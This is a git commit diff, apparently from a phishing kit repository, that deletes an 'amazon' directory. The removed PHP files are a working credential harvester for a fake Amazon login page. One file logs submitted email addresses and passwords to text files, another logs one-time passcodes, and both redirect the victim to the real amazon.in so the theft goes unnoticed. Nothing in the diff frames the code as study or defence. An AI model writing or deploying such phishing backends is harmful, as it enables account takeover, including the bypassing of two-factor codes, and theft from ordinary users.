9ecf55fa2871760c483fffc6d7b537abf0ca917b
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-04 13:04:38 +0530

    Delete amazon directory

--- amazon/otp/otp.php
+++
@@ -1,4 +0,0 @@
-<?php
-file_put_contents("otp.txt", "Amazon OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.amazon.in/');
-?>
--- amazon/process.php
+++
@@ -1,8 +0,0 @@
-<?php
-include 'ip.php';
-file_put_contents("usernames.txt", "Amazon Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
-?>
-<?php
-file_put_contents("pass.txt", "Amazon Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.amazon.in/');
-?>
